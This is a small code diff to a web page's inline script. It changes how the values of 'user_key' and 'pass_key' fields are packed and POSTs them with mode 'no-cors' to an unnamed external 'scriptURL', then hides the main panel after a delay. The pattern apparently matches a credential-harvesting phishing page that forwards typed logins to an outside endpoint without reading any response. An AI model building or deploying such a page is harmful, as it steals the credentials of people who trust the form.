@@ -200,15 +200,16 @@
 
       document.getElementById('spinner').style.display = 'block';
 
-      const data = {
-        user_key: document.getElementById('user_key').value,
-        pass_key: document.getElementById('pass_key').value
-      };
+    const formData = new FormData();
+formData.append('user_key', document.getElementById('user_key').value);
+formData.append('pass_key', document.getElementById('pass_key').value);
 
-      fetch(scriptURL, {
+fetch(scriptURL, {
   method: 'POST',
+  mode: 'no-cors',
   body: formData
 });
+
 
       setTimeout(() => {
         document.getElementById('panelMain').style.display = 'none';
@@ -231,5 +232,6 @@
   </script>
 </body>
 </html>
+
 
 
